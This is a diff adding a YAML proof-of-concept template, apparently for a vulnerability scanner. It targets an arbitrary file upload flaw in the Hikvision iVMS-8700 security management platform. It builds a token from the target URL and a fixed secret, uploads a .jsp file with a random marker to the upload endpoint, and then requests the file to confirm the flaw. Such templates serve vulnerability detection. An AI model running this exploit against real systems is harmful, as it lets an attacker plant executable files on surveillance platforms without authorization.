@@ -1,0 +1,36 @@
+id: poc-yaml-hikvision-ivms-8700-arbitrary-file-upload
+info:
+  name: HIKVISION-iVMS-8700综合安防管理平台-任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: iVMS-8700综合安防管理平台
+variables:
+  v1: md5(random_str(8))
+  boundary: random_str(10)
+  token: to_upper(md5(concat(base_url,"/eps/api/resourceOperations/uploadsecretKeyIbuilding")))
+requests:
+- method: POST
+  path: /eps/api/resourceOperations/upload?token={{.token}}
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.boundary}}
+  data: '------WebKitFormBoundary{{.boundary}}
+
+    Content-Disposition: form-data; name="fileUploader"; filename="test.jsp"
+
+    Content-Type: image/jpeg
+
+
+    {{.v1}}
+
+    ------WebKitFormBoundary{{.boundary}}--
+
+    '
+  expression: "status_code == 200 \n&& contains(body,\"{\\\"success\\\":true,\\\"\
+    message\\\":\\\"上传附件成功\\\"\")\n&& contains(body, \"resourceUuid\")\n"
+  output:
+  - regex_match(body, "\"resourceUuid\":\"(?P<fname>.*?)\"")
+- method: GET
+  path: /eps/upload/{{.fname}}.jsp
+  expression: status_code == 200 && contains(body, v1)
+transport: http
